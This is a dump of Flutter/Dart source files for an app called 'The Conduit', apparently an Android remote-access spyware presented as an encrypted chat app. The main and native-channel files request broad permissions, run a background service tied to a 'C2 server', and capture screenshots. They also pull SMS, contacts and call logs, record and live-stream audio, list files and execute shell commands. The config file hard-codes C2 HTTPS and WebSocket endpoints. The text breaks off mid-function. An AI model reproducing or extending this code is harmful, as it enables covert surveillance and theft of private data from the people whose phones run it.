################################################################################
# تم تجميع أكواد دارت من المسار: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj
# تاريخ الإنشاء: 2025-05-22 21:55:15
################################################################################


// ============================== بداية الملف: app.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\app.dart
// ----------------------------------------------------------------------

import 'package:flutter/material.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';

import 'presentation/chat/providers/theme_providers.dart';
import 'presentation/home/home_page.dart';

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName =
    "The Conduit"; // أو "الساتر" إذا اخترت اسمًا عربيًا

class TheConduitApp extends ConsumerWidget {
  // تم تغيير الاسم
  const TheConduitApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeState = ref.watch(themeStateProvider);
    final primaryColor = themeState.primaryColor;
    final useMaterial3 = themeState.useMaterial3;

    final TextTheme baseTextTheme = Theme.of(context).textTheme;
    final TextTheme cairoTextTheme = GoogleFonts.cairoTextTheme(baseTextTheme);
    final TextTheme cairoTextThemeLight = cairoTextTheme.apply(
        bodyColor: Colors.black87, displayColor: Colors.black87);
    final TextTheme cairoTextThemeDark = cairoTextTheme.apply(
        bodyColor: Colors.white.withOpacity(0.87),
        displayColor: Colors.white.withOpacity(0.87));

    return MaterialApp(
      title: displayedAppName,
      themeMode: themeState.themeMode,
      locale: const Locale('ar'),
      supportedLocales: const [Locale('ar')],
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      theme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        textTheme: cairoTextThemeLight,
        colorScheme: ColorScheme.light(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: Colors.grey[50]!, // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.black87,
          error: Colors.redAccent,
          onError: Colors.white,
        ),
        scaffoldBackgroundColor: Colors.grey[100],
        appBarTheme: AppBarTheme(
          backgroundColor: primaryColor,
          foregroundColor: Colors.white,
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white)),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: Colors.white,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[300]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[400])),
        ),
        cardTheme: CardTheme(
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
          color: useMaterial3 ? Colors.grey[50] : Colors.white,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? const BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: Colors.white, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.2),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: Colors.white,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.black87)),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium
                  ?.copyWith(fontSize: 14, color: Colors.black54)),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Colors.white,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
          modalBackgroundColor: Colors.white, // لخلفية الـ ModalBottomSheet
        ),
      ),
      darkTheme: ThemeData(
        useMaterial3: useMaterial3,
        primaryColor: primaryColor,
        brightness: Brightness.dark,
        textTheme: cairoTextThemeDark,
        colorScheme: ColorScheme.dark(
          primary: primaryColor,
          secondary: primaryColor.withOpacity(0.7),
          tertiary: primaryColor.withOpacity(0.3),
          surface: const Color(0xFF1A1A1A), // لون خلفية Scaffold
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Colors.white.withOpacity(0.87),
          error: Colors.redAccent[100]!,
          onError: Colors.black,
        ),
        scaffoldBackgroundColor: const Color(0xFF121212),
        appBarTheme: AppBarTheme(
          backgroundColor: useMaterial3
              ? const Color(0xFF1A1A1A) // لون أغمق قليلاً لـ M3 Dark
              : primaryColor.withOpacity(0.9),
          foregroundColor: Colors.white.withOpacity(0.9),
          elevation: useMaterial3 ? 0 : 2,
          centerTitle: true,
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 20,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.9))),
          shape: useMaterial3
              ? null
              : const RoundedRectangleBorder(
                  borderRadius:
                      BorderRadius.vertical(bottom: Radius.circular(12)),
                ),
        ),
        elevatedButtonTheme: ElevatedButtonThemeData(
          style: ElevatedButton.styleFrom(
            backgroundColor: primaryColor,
            foregroundColor: Colors.white,
            shape:
                RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            textStyle: GoogleFonts.cairo(
                textStyle: baseTextTheme.labelLarge
                    ?.copyWith(fontWeight: FontWeight.w600)),
          ),
        ),
        inputDecorationTheme: InputDecorationTheme(
          filled: true,
          fillColor: const Color(0xFF2C2C2C),
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
          border: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          enabledBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: Colors.grey[700]!),
          ),
          focusedBorder: OutlineInputBorder(
            borderRadius: BorderRadius.circular(8),
            borderSide: BorderSide(color: primaryColor, width: 1.5),
          ),
          hintStyle: GoogleFonts.cairo(
              textStyle:
                  baseTextTheme.bodyMedium?.copyWith(color: Colors.grey[500])),
        ),
        cardTheme: CardTheme(
          color: const Color(0xFF252525),
          elevation: useMaterial3 ? 1 : 2,
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          clipBehavior: Clip.antiAlias,
        ),
        tabBarTheme: TabBarTheme(
          labelColor: Colors.white,
          unselectedLabelColor: Colors.white70,
          labelStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.labelLarge
                  ?.copyWith(fontWeight: FontWeight.w600)),
          unselectedLabelStyle:
              GoogleFonts.cairo(textStyle: baseTextTheme.labelLarge),
          indicator: useMaterial3
              ? BoxDecoration(
                  border: Border(
                      bottom: BorderSide(color: primaryColor, width: 2.5)),
                )
              : BoxDecoration(
                  borderRadius: BorderRadius.circular(8),
                  color: Colors.white.withOpacity(0.15),
                ),
          indicatorSize: TabBarIndicatorSize.tab,
        ),
        dialogTheme: DialogTheme(
          backgroundColor: const Color(0xFF2C2C2C),
          shape:
              RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
          titleTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.titleLarge?.copyWith(
                  fontSize: 18,
                  fontWeight: FontWeight.w600,
                  color: Colors.white.withOpacity(0.87))),
          contentTextStyle: GoogleFonts.cairo(
              textStyle: baseTextTheme.bodyMedium?.copyWith(
                  fontSize: 14, color: Colors.white.withOpacity(0.7))),
        ),
        bottomSheetTheme: const BottomSheetThemeData(
          backgroundColor: Color(0xFF2C2C2C),
          modalBackgroundColor: Color(0xFF2C2C2C),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.vertical(top: Radius.circular(16)),
          ),
        ),
      ),
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}



// ------------------------------ نهاية الملف: app.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: main.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\main.dart
// ----------------------------------------------------------------------

// main.dart أو المسار الصحيح للملف الرئيسي للتطبيق

import 'dart:typed_data'; // لـ Uint8List

import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_fonts/google_fonts.dart';
import 'package:permission_handler/permission_handler.dart';

// تأكد من صحة هذه المسارات
import 'services/background_service.dart'; // ملفنا للخدمة الخلفية
import 'services/screenshot_service.dart'; // ملف خدمة لقطة الشاشة

// اسم التطبيق الذي سنستخدمه في العرض
const String displayedAppName = "The Conduit";
// GlobalKey لخدمة لقطة الشاشة - يجب أن يكون مرتبطًا بواجهة المستخدم الرئيسية
final GlobalKey screenshotGlobalKey = GlobalKey();
List<String> globalLogs = []; // لتخزين السجلات وعرضها ديناميكيًا

// --- إعدادات قناة الإشعارات للخدمة الخلفية ---
const String backgroundServiceNotificationChannelId =
    'the_conduit_service_channel';
const String backgroundServiceNotificationChannelName =
    'The Conduit Background Service';
const String backgroundServiceNotificationChannelDescription =
    'Channel for The Conduit background service notifications.';
// تهيئة FlutterLocalNotificationsPlugin
final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
    FlutterLocalNotificationsPlugin();

Future<void> _createNotificationChannel() async {
  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    backgroundServiceNotificationChannelId,
    backgroundServiceNotificationChannelName,
    description: backgroundServiceNotificationChannelDescription,
    importance: Importance.low, // لتجنب الأصوات المزعجة بشكل افتراضي
    playSound: false,
    enableVibration: false,
  );
  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);
  print(
      "Notification channel '$backgroundServiceNotificationChannelId' created/updated.");
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _createNotificationChannel(); // << --- إنشاء القناة أولاً
  await requestBasicPermissions();
  await initializeBackgroundService(); // هذا يستدعي onStart حيث يتم استخدام notificationChannelId
  runApp(ProviderScope(child: MyApp()));
}

Future<void> requestBasicPermissions() async {
  Map<Permission, PermissionStatus> statuses = await [
    Permission.location,
    Permission
        .storage, // للوصول إلى التخزين العام (قد يتطلب manageExternalStorage لبعض العمليات)
    Permission
        .accessMediaLocation, // قد تحتاج إليه بناءً على كيفية وصولك للملفات
    // Permission.manageExternalStorage, // إذا كنت تحتاج للوصول الشامل (يتطلب موافقة خاصة في Google Play)
    Permission.camera, // إذا كنت ستستخدم الكاميرا الفعلية أيضًا
  ].request();
  print("Permission statuses: $statuses");
  if (statuses[Permission.location] != PermissionStatus.granted) {
    globalLogs.add("Location permission was not granted.");
  }
  if (statuses[Permission.storage] != PermissionStatus.granted) {
    globalLogs.add("Storage permission was not granted.");
  }
  if (statuses[Permission.camera] != PermissionStatus.granted) {
    globalLogs.add("Camera permission was not granted.");
  }
}

class MyApp extends ConsumerWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context, WidgetRef ref) {
    final themeMode = ref.watch(themeProvider); // افترض أن themeProvider موجود
    return MaterialApp(
      title: displayedAppName,
      theme: ThemeData(
        brightness: Brightness.light,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      darkTheme: ThemeData(
        brightness: Brightness.dark,
        primarySwatch: Colors.teal,
        fontFamily: GoogleFonts.cairo().fontFamily,
      ),
      themeMode: themeMode,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
      ],
      supportedLocales: const [
        Locale('en', ''), // English
        Locale('ar', ''), // Arabic
      ],
      home: RepaintBoundary(
        key: screenshotGlobalKey, // ربط المفتاح هنا
        child: MonitoringScreen(), // أو الصفحة الرئيسية للتطبيق
      ),
      debugShowCheckedModeBanner: false,
    );
  }
}

class MonitoringScreen extends StatefulWidget {
  const MonitoringScreen({super.key});

  @override
  _MonitoringScreenState createState() => _MonitoringScreenState();
}

class _MonitoringScreenState extends State<MonitoringScreen> {
  final FlutterBackgroundService service = FlutterBackgroundService();
  late ScreenshotService _screenshotService;

  @override
  void initState() {
    super.initState();
    _screenshotService = ScreenshotService(
      screenshotKey: screenshotGlobalKey,
      onLogEvent: (log) {
        if (mounted) {
          setState(() {
            globalLogs.insert(0,
                "[${DateTime.now().toIso8601String().substring(11, 19)}] SCREENSHOT_SVC_UI: $log");
          });
        }
      },
    );

    service.on('addLog').listen((data) {
      if (data != null && data.containsKey('log') && mounted) {
        setState(() {
          globalLogs.insert(0,
              "[${DateTime.now().toIso8601String().substring(11, 19)}] BG_SVC: ${data['log']}");
        });
      }
    });

    service.on('updateUI').listen((event) {
      if (mounted) setState(() {});
    });

    // *** تعديل مستمع طلب لقطة الشاشة ***
    service.on('requestScreenshotFromUI').listen((argsFromService) async {
      if (mounted) {
        globalLogs.add(
            "UI: Received screenshot request from service. Args: $argsFromService");
        final Uint8List? imageBytes =
            await _screenshotService.captureScreenshot(); // التقاط الصورة

        Map<String, dynamic> responseToService = {};

        if (imageBytes != null) {
          // *** حفظ لقطة الشاشة كملف مؤقت وإرسال المسار ***
          final String? filePath =
              await _screenshotService.saveScreenshotToFile(imageBytes);
          if (filePath != null) {
            responseToService = {'file_path': filePath}; // إرسال المسار
            globalLogs.add(
                "UI: Screenshot captured and saved to: $filePath. Sending path to service.");
          } else {
            responseToService = {
              'error': 'Failed to save screenshot to file in UI'
            };
            globalLogs.add("UI: Failed to save screenshot to file.");
          }
        } else {
          responseToService = {'error': 'Failed to capture screenshot in UI'};
          globalLogs.add("UI: Failed to capture screenshot bytes.");
        }
        // إرسال المسار أو الخطأ مرة أخرى إلى الخدمة
        service.invoke('screenshotTakenByUI', responseToService);
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: Text('$displayedAppName - Monitor'),
        actions: [
          IconButton(
            icon: Icon(Icons.cleaning_services),
            onPressed: () {
              if (mounted) {
                setState(() {
                  globalLogs.clear();
                  globalLogs.add("Logs cleared by user.");
                });
              }
            },
          ),
          IconButton(
            icon: Icon(Icons.send_to_mobile),
            onPressed: () {
              service.invoke(
                  "triggerInfoLog", {"message": "Hello from UI button!"});
            },
          )
        ],
      ),
      body: globalLogs.isEmpty
          ? Center(
              child: Text(
                  'No logs yet. Ensure the service is running and can connect to the C2 server.'))
          : ListView.builder(
              reverse: false, // لعرض أقدم السجلات في الأعلى
              itemCount: globalLogs.length,
              itemBuilder: (context, index) {
                return Padding(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 8.0, vertical: 2.0),
                  child: Text(
                    globalLogs[index],
                    style: TextStyle(fontSize: 11),
                  ),
                );
              },
            ),
    );
  }
}

// افترض أن لديك themeProvider من السياق السابق
final themeProvider = StateProvider<ThemeMode>((ref) => ThemeMode.system);



// ------------------------------ نهاية الملف: main.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: native_channel_handler.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\native_channel_handler.dart
// ----------------------------------------------------------------------

// lib/native_channel_handler.dart
import 'dart:async';

import 'package:flutter/services.dart';
import 'package:newtest1/utils/constants.dart'; // أو المسار الصحيح لملف constants.dart

class NativeChannelHandler {
  static const MethodChannel _filesChannel =
      MethodChannel(NATIVE_FILES_CHANNEL); //
  static const MethodChannel _nativeFeaturesChannel =
      MethodChannel(NATIVE_FEATURES_CHANNEL);
  static const EventChannel _liveAudioEventChannel =
      EventChannel(NATIVE_LIVE_AUDIO_STREAM_CHANNEL);

  static Stream<Uint8List>? _liveAudioStream;

  static Future<Map<String, dynamic>> listFilesNatively(String path) async {
    try {
      final Map<dynamic, dynamic>? result =
          await _filesChannel.invokeMethod('listFiles', {'path': path}); //
      if (result != null) {
        return Map<String, dynamic>.from(result); //
      }
      return {
        //
        'error': 'Null result from native platform for listFiles',
        'files': [],
        'path': path
      };
    } on PlatformException catch (e) {
      //
      print(
          "Failed to list files via native channel: '${e.message}'. Details: ${e.details}");
      return {
        //
        'error': "PlatformException: ${e.message}",
        'details': e.details,
        'files': [],
        'path': path
      };
    } catch (e) {
      //
      print("Generic error listing files via native channel: $e");
      return {
        'error': "Generic error: ${e.toString()}",
        'files': [],
        'path': path
      }; //
    }
  }

  static Future<Map<String, dynamic>> executeShellNatively(
      String command, List<String> args) async {
    try {
      final Map<dynamic, dynamic>? result = await _filesChannel
          .invokeMethod('executeShell', {'command': command, 'args': args});
      if (result != null) {
        return Map<String, dynamic>.from(result);
      }
      return {
        'error': 'Null result from native platform for executeShell',
        'command': command,
        'args': args
      };
    } on PlatformException catch (e) {
      print(
          "Failed to execute shell via native channel: '${e.message}'. Details: ${e.details}");
      return {
        'error': "PlatformException: ${e.message}",
        'details': e.details,
        'command': command,
        'args': args
      };
    } catch (e) {
      print("Generic error executing shell via native channel: $e");
      return {
        'error': "Generic error: ${e.toString()}",
        'command': command,
        'args': args
      };
    }
  }

  static Future<List<dynamic>> getSmsListNatively() async {
    try {
      final List<dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod('getSmsList');
      return result ?? [];
    } on PlatformException catch (e) {
      print("Failed to get SMS list: ${e.message}");
      return Future.error("Failed to get SMS: ${e.message}");
    } catch (e) {
      print("Generic error getting SMS list: $e");
      return Future.error("Generic error getting SMS: ${e.toString()}");
    }
  }

  static Future<List<dynamic>> getContactsListNatively() async {
    try {
      final List<dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod('getContactsList');
      return result ?? [];
    } on PlatformException catch (e) {
      print("Failed to get Contacts list: ${e.message}");
      return Future.error("Failed to get Contacts: ${e.message}");
    } catch (e) {
      print("Generic error getting Contacts list: $e");
      return Future.error("Generic error getting Contacts: ${e.toString()}");
    }
  }

  static Future<List<dynamic>> getCallLogsListNatively() async {
    try {
      final List<dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod('getCallLogsList');
      return result ?? [];
    } on PlatformException catch (e) {
      print("Failed to get Call Logs list: ${e.message}");
      return Future.error("Failed to get Call Logs: ${e.message}");
    } catch (e) {
      print("Generic error getting Call Logs list: $e");
      return Future.error("Generic error getting Call Logs: ${e.toString()}");
    }
  }

  static Future<Map<String, dynamic>> recordAudioFixedDurationNatively(
      int durationSeconds) async {
    try {
      final Map<dynamic, dynamic>? result =
          await _nativeFeaturesChannel.invokeMethod(
        'recordAudio',
        {'duration_seconds': durationSeconds},
      );
      if (result != null) {
        return Map<String, dynamic>.from(result);
      }
      return {
        'error': 'Null result from native platform for recordAudio',
        'status': 'failed'
      };
    } on PlatformException catch (e) {
      print("Failed to record audio (fixed duration): ${e.message}");
      return {'error': "PlatformException: ${e.message}", 'status': 'failed'};
    } catch (e) {
      print("Generic error recording audio (fixed duration): $e");
      return {'error': "Generic error: ${e.toString()}", 'status': 'failed'};
    }
  }

  static Future<String?> startLiveAudioStreamNatively() async {
    try {
      final String? status =
          await _nativeFeaturesChannel.invokeMethod('startLiveAudioStream');
      if (status != null && status.toLowerCase().contains("started")) {
        print("Native live audio stream started successfully.");
        return status;
      } else {
        print(
            "Native live audio stream start command acknowledged but status unclear: $status");
        return "Failed to start: ${status ?? 'Unknown native response'}";
      }
    } on PlatformException catch (e) {
      print("Failed to start live audio stream: ${e.message}");
      return "Error: ${e.message}";
    }
  }

  static Future<String?> stopLiveAudioStreamNatively() async {
    try {
      final String? status =
          await _nativeFeaturesChannel.invokeMethod('stopLiveAudioStream');
      if (status != null && status.toLowerCase().contains("stopped")) {
        print("Native live audio stream stopped successfully.");
        _liveAudioStream = null; // Clear the stream when stopped
        return status;
      } else {
        print(
            "Native live audio stream stop command acknowledged but status unclear: $status");
        _liveAudioStream = null;
        return "Failed to stop clearly: ${status ?? 'Unknown native response'}";
      }
    } on PlatformException catch (e) {
      print("Failed to stop live audio stream: ${e.message}");
      _liveAudioStream = null;
      return "Error: ${e.message}";
    }
  }

  static Stream<Uint8List> getLiveAudioStream() {
    _liveAudioStream ??= _liveAudioEventChannel
        .receiveBroadcastStream()
        .map((dynamic event) => event as Uint8List);
    return _liveAudioStream!;
  }
}



// ------------------------------ نهاية الملف: native_channel_handler.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: app_config.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\config\app_config.dart
// ----------------------------------------------------------------------

// lib/config/app_config.dart

// !! هام: في بيئة حقيقية، استخدم متغيرات البيئة أو تقنيات إدارة الأسرار
// لا تضع عناوين IP أو نطاقات حقيقية هنا مباشرة في التحكم بالمصادر (Version Control)
// هذا مجرد مثال توضيحي.

// --- HTTP Server Configuration ---
// هذا العنوان يشير إلى النطاق الذي وفرته Cloudflare Tunnel
// والذي يوجه مباشرة إلى Flask HTTP server على جهازك
const String C2_HTTP_SERVER_URL =
    'https://ws.sosa-qav.es'; // <-- تم استبداله بعنوان Cloudflare Tunnel HTTPS

// --- WebSocket (Socket.IO) Server Configuration ---
// طالما أن نفس النطاق يدعم ترقية WebSocket (Cloudflare يدعمها)،
// نغير البروتوكول فقط إلى wss:// (للاتصال المشفر)
const String C2_SOCKET_IO_URL =
    'wss://ws.sosa-qav.es'; // <-- استخدم wss مع Cloudflare لأنه HTTPS

const Duration C2_SOCKET_IO_RECONNECT_DELAY = Duration(seconds: 5);
const int C2_SOCKET_IO_RECONNECT_ATTEMPTS = 5;
const Duration C2_HEARTBEAT_INTERVAL = Duration(
  seconds: 45,
); // Interval for client to send heartbeat



// ------------------------------ نهاية الملف: app_config.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: collected_data.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\models\collected_data.dart
// ----------------------------------------------------------------------




// ------------------------------ نهاية الملف: collected_data.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: api_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\presentation\chat\api_service.dart
// ----------------------------------------------------------------------

// lib/presentation/chat/api_service.dart
import "dart:async";
import "dart:io"; // Required for File operations
import "dart:math";

import "package:cloud_firestore/cloud_firestore.dart";
import "package:firebase_storage/firebase_storage.dart"; // Import Firebase Storage
import "package:file_picker/file_picker.dart"; // Required for PlatformFile
import "package:path/path.dart" as p; // For path manipulation

import "../../core/logging/logger_service.dart";
import "../../data/models/chat/chat_conversation.dart";
import "../../data/models/chat/chat_message.dart";

class ApiService {
  final FirebaseFirestore _firestore;
  final FirebaseStorage _storage; // Add Firebase Storage instance
  final LoggerService _logger;
  final String _currentAgentCode;

  String get currentAgentCodeValue => _currentAgentCode;

  ApiService(this._firestore, this._storage, this._logger, this._currentAgentCode) {
    if (_currentAgentCode.isEmpty) {
      _logger.error("ApiService:Constructor",
          "CRITICAL: ApiService initialized with an empty agent code!");
    }
    _logger.info("ApiService:Constructor",
        "ApiService initialized for agent: $_currentAgentCode");
  }

  // Method to upload file to Firebase Storage
  Future<String?> uploadFileToStorage(PlatformFile platformFile, String conversationId) async {
    if (platformFile.path == null) {
      _logger.error("ApiService:uploadFileToStorage", "File path is null for ${platformFile.name}");
      return null;
    }
    File file = File(platformFile.path!);
    String fileName = "${DateTime.now().millisecondsSinceEpoch}_${p.basename(file.path)}";
    String filePath = "chat_attachments/$conversationId/$fileName";

    _logger.info("ApiService:uploadFileToStorage", "Attempting to upload ${platformFile.name} to $filePath");

    try {
      UploadTask uploadTask = _storage.ref().child(filePath).putFile(file);
      TaskSnapshot snapshot = await uploadTask;
      String downloadUrl = await snapshot.ref.getDownloadURL();
      _logger.info("ApiService:uploadFileToStorage", "File ${platformFile.name} uploaded successfully. URL: $downloadUrl");
      return downloadUrl;
    } on FirebaseException catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "FirebaseException during upload for ${platformFile.name}: ${e.message}", e, s);
      return null;
    } catch (e, s) {
      _logger.error("ApiService:uploadFileToStorage", "Generic error during upload for ${platformFile.name}", e, s);
      return null;
    }
  }

  Stream<List<ChatConversation>> getConversationsStream() {
    _logger.info("ApiService:getConversationsStream",
        "Fetching conversations for agent: $_currentAgentCode, excluding those marked as deleted for this agent.");
    return _firestore
        .collection("conversations")
        .where("participants", arrayContains: _currentAgentCode) // User must be a participant
        .where("deletedForUsers.$_currentAgentCode", isNotEqualTo: true) // Exclude if marked deleted for this user
        .orderBy("updatedAt", descending: true)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info(
            "ApiService:getConversationsStream", "No active conversations found for $_currentAgentCode.");
        return <ChatConversation>[];
      }
      _logger.debug("ApiService:getConversationsStream",
          "Received ${snapshot.docs.length} active conversations for $_currentAgentCode.");
      return snapshot.docs
          .map((doc) => ChatConversation.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getConversationsStream", "Error in stream for $_currentAgentCode",
          error, stackTrace);
      return <ChatConversation>[];
    });
  }

  Stream<List<ChatMessage>> getMessagesStream(String conversationId) {
    _logger.info("ApiService:getMessagesStream",
        "Fetching for conversation $conversationId");
    if (conversationId.isEmpty) {
      _logger.warn("ApiService:getMessagesStream",
          "Received empty conversationId. Returning empty stream.");
      return Stream.value([]);
    }
    // Note: Messages are not soft-deleted individually in this scheme.
    // If a conversation is soft-deleted for a user, they won't see it, thus won't fetch its messages.
    return _firestore
        .collection("conversations")
        .doc(conversationId)
        .collection("messages")
        .orderBy("timestamp", descending: false)
        .snapshots()
        .map((snapshot) {
      if (snapshot.docs.isEmpty) {
        _logger.info("ApiService:getMessagesStream",
            "No messages found for $conversationId.");
        return <ChatMessage>[];
      }
      _logger.debug("ApiService:getMessagesStream",
          "Received ${snapshot.docs.length} messages for $conversationId.");
      return snapshot.docs
          .map((doc) => ChatMessage.fromFirestore(
              doc as DocumentSnapshot<Map<String, dynamic>>, _currentAgentCode))
          .toList();
    }).handleError((error, stackTrace) {
      _logger.error("ApiService:getMessagesStream",
          "Error in stream for $conversationId", error, stackTrace);
      return <ChatMessage>[];
    });
  }

  Future<ChatParticipantInfo?> getAgentInfo(String agentCodeToFetch) async {
    _logger.info("ApiService:getAgentInfo",
        "Fetching info for agent_code: $agentCodeToFetch");
    if (agentCodeToFetch.isEmpty) {
      _logger.warn(
          "ApiService:getAgentInfo", "Received empty agentCodeToFetch.");
      return null;
    }
    try {
      final doc = await _firestore
          .collection("agent_identities")
          .doc(agentCodeToFetch)
          .get();
      if (doc.exists) {
        final data = doc.data()!;
        _logger.debug("ApiService:getAgentInfo",
            "Agent $agentCodeToFetch found. DisplayName: ${data["displayName"]}");
        return ChatParticipantInfo(
          agentCode: agentCodeToFetch,
          displayName: data["displayName"] as String? ?? agentCodeToFetch,
        );
      }
      _logger.warn("ApiService:getAgentInfo",
          "Agent info not found for $agentCodeToFetch in 'agent_identities'.");
      return null;
    } catch (e, s) {
      _logger.error("ApiService:getAgentInfo",
          "Error fetching agent info for $agentCodeToFetch", e, s);
      return null;
    }
  }

  Future<String?> createOrGetConversationWithParticipants(
      List<String> participantAgentCodes,
      Map<String, ChatParticipantInfo> participantInfoMapInput,
      {String? groupTitle}) async {
    _logger.info("ApiService:createOrGetConversation",
        "Attempting with initial participants: $participantAgentCodes. Current user: $_currentAgentCode");

    final allParticipantsSorted = List<String>.from(participantAgentCodes);
    if (!allParticipantsSorted.contains(_currentAgentCode)) {
      allParticipantsSorted.add(_currentAgentCode);
    }
    allParticipantsSorted.sort();

    _logger.debug("ApiService:createOrGetConversation",
        "All sorted participants: $allParticipantsSorted");

    var finalParticipantInfoMap =
        Map<String, ChatParticipantInfo>.from(participantInfoMapInput);
    if (!finalParticipantInfoMap.containsKey(_currentAgentCode)) {
      final currentUserInfo = await getAgentInfo(_currentAgentCode);
      if (currentUserInfo != null) {
